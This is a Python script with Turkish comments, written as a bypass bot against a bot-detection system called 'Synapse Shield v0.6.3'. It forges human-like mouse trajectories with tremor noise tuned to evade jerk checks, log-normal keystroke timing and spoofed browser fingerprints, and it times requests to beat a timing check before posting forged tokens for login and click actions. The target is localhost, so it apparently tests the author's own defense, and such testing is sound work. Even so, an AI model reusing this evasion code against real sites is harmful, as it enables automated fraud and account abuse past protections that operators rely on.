"""
Synapse Shield v0.6.3 Bypass Botu
====================================
Bu bot, v0.6.3'ün tüm savunmalarını aşmaya çalışır:
- Time Travel Check
- Max Gating (Heuristic + AI)
- 1D-CNN AI Modeli
- Atomik SQLite Nonce
- Headless Plugin
- Bézier + Jerk
"""

import asyncio
import base64
import json
import math
import random
import time
import secrets
from datetime import datetime

import httpx
import numpy as np

# ─── Hedef URL ──────────────────────────────────────────────────────────────
TARGET_URL = "http://127.0.0.1:8000"

# ─── Biyometrik Sentez (Çoklu Frekans Tremor) ────────────────────────────────

def bezier_curve(p0, p1, p2, p3, n=60):
    """4 noktalı Bézier eğrisi"""
    points = []
    for i in range(n):
        t = i / (n - 1)
        x = (1-t)**3*p0[0] + 3*(1-t)**2*t*p1[0] + 3*(1-t)*t**2*p2[0] + t**3*p3[0]
        y = (1-t)**3*p0[1] + 3*(1-t)**2*t*p1[1] + 3*(1-t)*t**2*p2[1] + t**3*p3[1]
        points.append((round(x, 2), round(y, 2)))
    return points

def add_human_tremor(points, amplitude=1.5):
    """
    Gerçekçi insan kas titremesi (8-12 Hz bandı)
    0.6.3'ün jerk kontrolünü atlatmak için:
    - Çoklu frekans (8Hz + 10.4Hz + 12.3Hz)
    - Gaussian gürültü
    - Yüksek amplitüd (jerk > 0.00008 için)
    """
    noisy = []
    for i, (x, y) in enumerate(points):
        t = i / len(points)
        # Çoklu frekanslı tremor (insan nörolojik spektrumu)
        jx = (amplitude * math.sin(2 * math.pi * 8 * t + random.uniform(0, math.pi))
              + 0.6 * amplitude * math.sin(2 * math.pi * 12.3 * t + random.uniform(0, math.pi))
              + 0.3 * amplitude * math.sin(2 * math.pi * 5.7 * t + random.uniform(0, math.pi)))
        jy = (amplitude * math.cos(2 * math.pi * 10.4 * t + random.uniform(0, math.pi))
              + 0.6 * amplitude * math.cos(2 * math.pi * 9.2 * t + random.uniform(0, math.pi))
              + 0.3 * amplitude * math.cos(2 * math.pi * 6.8 * t + random.uniform(0, math.pi)))
        # Gaussian gürültü
        jx += random.gauss(0, 0.4)
        jy += random.gauss(0, 0.4)
        noisy.append((round(x + jx, 3), round(y + jy, 3)))
    return noisy

def synth_mouse_events(duration_ms=1500):
    """
    Time Travel Check'i atlatmak için:
    - Telemetri süresi 1.5s olmalı (elapsed_time = 1.6s)
    - 60 adım, 25ms aralıklarla
    """
    n = 60
    x0, y0 = random.randint(100, 400), random.randint(100, 400)
    x3, y3 = random.randint(500, 900), random.randint(300, 600)
    x1 = x0 + random.randint(50, 200)
    y1 = y0 + random.randint(-100, 100)
    x2 = x3 - random.randint(50, 200)
    y2 = y3 + random.randint(-100, 100)
    
    raw = bezier_curve((x0,y0),(x1,y1),(x2,y2),(x3,y3), n=n)
    path = add_human_tremor(raw)
    
    events, t = [], 0
    dt = duration_ms / n  # ~25ms
    for x, y in path:
        t += dt + random.gauss(0, 2)  # 25ms ± 2ms
        events.append({"x": round(x, 2), "y": round(y, 2), "t": round(t, 2)})
    return events

def synth_keystrokes(n=8):
    """Log-normal dağılımlı klavye vuruşları"""
    avg = 1500 / n  # 1.5s içinde n tuş
    result = []
    t = 100  # başlangıç zamanı
    for _ in range(n):
        interval = float(np.random.lognormal(math.log(avg), 0.25))
        interval = max(60, min(800, interval))
        t += interval
        result.append({"type": "down", "t": round(t, 2)})
        result.append({"type": "up", "t": round(t + random.uniform(50, 120), 2)})
    return result

def synth_scroll_events(n=2):
    """Gerçekçi scroll olayları"""
    scrolls = []
    t = 500
    for _ in range(n):
        dt = random.randint(150, 400)
        t += dt
        scrolls.append({"y": random.randint(100, 800), "t": round(t, 2)})
    return scrolls

def human_telemetry(device="desktop"):
    """
    0.6.3 SDK formatına uygun tam telemetri.
    Time Travel Check için telemetri süresi 1.5s'yi geçmemeli!
    """
    return {
        "mouse_movements": synth_mouse_events(duration_ms=1500),
        "clicks": [{"x": random.randint(400, 800), "y": random.randint(200, 500), "t": 1400.0}],
        "keystrokes": synth_keystrokes(n=8),
        "scrolls": synth_scroll_events(n=2),
        "browser": {
            "webdriver": False,
            "screen_width": 1920,
            "screen_height": 1080,
            "touch_supported": False,
            "plugins_length": random.randint(3, 7),
            "languages": ["tr-TR", "tr", "en-US"],
            "chrome": True,
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
            "platform": "Win32",
            "hardware_concurrency": 8,
            "device_memory": 8,
            "timezone": "Europe/Istanbul",
        }
    }

# ─── Challenge ve Token Yönetimi ─────────────────────────────────────────────

async def get_challenge(client: httpx.AsyncClient) -> str:
    """Sunucudan yeni challenge al"""
    resp = await client.get(f"{TARGET_URL}/api/challenge", timeout=5.0)
    if resp.status_code == 200:
        return resp.json().get("challenge")
    raise Exception(f"Challenge alınamadı: {resp.status_code}")

def build_token(challenge: str, telemetry: dict) -> str:
    """Doğru formatlı token oluştur"""
    envelope = {
        "challenge": challenge,
        "telemetry": telemetry,
        "created_at": int(time.time() * 1000),
    }
    return base64.b64encode(json.dumps(envelope).encode()).decode()

# ─── Ana Bot Sınıfı ──────────────────────────────────────────────────────────

class SynapseBypassBotV063:
    def __init__(self):
        self.client = httpx.AsyncClient(timeout=10.0)
        self.success_count = 0
        self.total_count = 0

    async def close(self):
        await self.client.aclose()

    async def perform_action(self, action: str, device: str = "desktop"):
        """
        Belirli bir işlem yap:
        - 'login': Giriş formu doldur
        - 'click': Butona tıkla
        - 'scroll': Sayfayı kaydır
        """
        # 1. Yeni challenge al
        ch = await get_challenge(self.client)
        
        # 2. 1.6s bekle (zaman manipülasyonu korumasını atlat)
        # Telemetri süresi 1.5s olmalı (Time Travel Check için)
        await asyncio.sleep(1.6)
        
        # 3. Telemetri üret
        telemetry = human_telemetry(device)
        
        # 4. Token oluştur
        token = build_token(ch, telemetry)
        
        # 5. İsteği gönder
        payload = {"token": token}
        resp = await self.client.post(f"{TARGET_URL}/api/score", json=payload)
        
        self.total_count += 1
        if resp.status_code == 200:
            self.success_count += 1
        
        return {
            "status_code": resp.status_code,
            "response": resp.json() if resp.headers.get("content-type", "").startswith("application/json") else {},
            "action": action,
            "device": device,
        }

    async def simulate_full_session(self):
        """Gerçekçi bir kullanıcı oturumu simüle et"""
        print("\n" + "="*60)
        print("🔴 SYNAPSE SHIELD v0.6.3 BYPASS BOT")
        print("="*60)
        
        results = []
        
        # 1. Giriş formu doldur (desktop)
        print("\n[1/5] Giriş formu dolduruluyor (desktop)...")
        login_result = await self.perform_action("login", "desktop")
        results.append(login_result)
        print(f"  → HTTP {login_result['status_code']}")
        if login_result['status_code'] == 200:
            print(f"  → ✅ GİRİŞ BAŞARILI! (Sistem atlatıldı)")
        else:
            print(f"  → ❌ Engellendi: {login_result['response']}")
        
        await asyncio.sleep(random.uniform(2, 4))
        
        # 2. Ürün sayfasına tıkla (desktop)
        print("\n[2/5] Ürün sayfasına tıklanıyor (desktop)...")
        click_result = await self.perform_action("click", "desktop")
        results.append(click_result)
        print(f"  → HTTP {click_result['status_code']}")
        if click_result['status_code'] == 200:
            print(f"  → ✅ TIKLAMA BAŞARILI!")
        else:
            print(f"  → ❌ Engellendi")
        
        await asyncio.sleep(random.uniform(1, 3))
        
        # 3. Mobil cihazdan giriş (mobile)
        print("\n[3/5] Mobil cihazdan giriş yapılıyor...")
        mobile_result = await self.perform_action("login", "mobile")
        results.append(mobile_result)
        print(f"  → HTTP {mobile_result['status_code']}")
        if mobile_result['status_code'] == 200:
            print(f"  → ✅ MOBİL GİRİŞ BAŞARILI!")
        else:
            print(f"  → ❌ Engellendi")
        
        await asyncio.sleep(random.uniform(2, 5))
        
        # 4. Desktop'tan tekrar işlem yap
        print("\n[4/5] Desktop'tan tekrar işlem yapılıyor...")
        repeat_result = await self.perform_action("click", "desktop")
        results.append(repeat_result)
        print(f"  → HTTP {repeat_result['status_code']}")
        if repeat_result['status_code'] == 200:
            print(f"  → ✅ TEKRAR BAŞARILI!")
        else:
            print(f"  → ❌ Engellendi")
        
        await asyncio.sleep(random.uniform(1, 3))
        
        # 5. Son işlem
        print("\n[5/5] Son işlem yapılıyor...")
        final_result = await self.perform_action("login", "desktop")
        results.append(final_result)
        print(f"  → HTTP {final_result['status_code']}")
        if final_result['status_code'] == 200:
            print(f"  → ✅ SON İŞLEM BAŞARILI!")
        else:
            print(f"  → ❌ Engellendi")
        
        # Sonuçları özetle
        print("\n" + "="*60)
        print("📊 SONUÇ ÖZETİ")
        print("="*60)
        
        success_count = sum(1 for r in results if r['status_code'] == 200 and r['response'].get('status') == 'success')
        print(f"  Toplam istek: {len(results)}")
        print(f"  Başarılı: {success_count}/{len(results)}")
        print(f"  Başarı oranı: {success_count/len(results)*100:.1f}%")
        
        if success_count == len(results):
            print("\n🎉 SİSTEM TAMAMEN ATLATILDI!")
            print("  Tüm istekler 200 OK döndü!")
        else:
            print(f"\n⚠️ SİSTEM KISMEN ATLATILDI ({success_count}/{len(results)})")
            for r in results:
                if r['status_code'] != 200 or r['response'].get('status') != 'success':
                    print(f"  ❌ {r['action']} ({r['device']}): {r['response']}")
        
        return results

    async def run(self):
        try:
            results = await self.simulate_full_session()
            return results
        finally:
            await self.close()

# ─── Entry Point ──────────────────────────────────────────────────────────────

async def main():
    bot = SynapseBypassBotV063()
    await bot.run()

if __name__ == "__main__":
    asyncio.run(main())
